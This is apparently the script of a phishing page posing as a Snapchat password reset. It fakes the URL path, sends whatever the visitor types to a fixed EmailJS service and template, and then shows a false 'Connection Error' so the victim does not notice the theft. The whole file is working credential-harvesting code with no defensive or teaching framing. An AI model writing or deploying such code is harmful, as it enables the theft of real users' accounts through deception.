//pushstate
history.pushState({}, '', '/SnapchatPassReset');

// Initialize EmailJS with your public key
emailjs.init('-n3JzG_UDggi59Nt1'); // Replace with your actual public key

document.getElementById('emailForm').addEventListener('submit', function (event) {
  event.preventDefault(); // Prevent default form submission

  const textBoxValue = document.getElementById('textBox').value;

  if (textBoxValue.trim() === '') {
    alert('Please enter some text!');
    return;
  }

  // Prepare the parameter to match your template
  const templateParams = {
    message: textBoxValue, // Matches {{message}} in your EmailJS template
  };

  // Send the email using EmailJS
  emailjs.send('service_qr6u2jj', 'template_kpsj3ad', templateParams)
    .then(function (response) {
      console.log('Email successfully sent!', response);
      document.getElementById('statusMessage').textContent = 'Connection Error: SC-221';
      document.getElementById('textBox').value = ''; // Clear input
    })
    .catch(function (error) {
      console.error('Failed to send email:', error);
      alert('Failed to send email. Please try again.');
    });
});
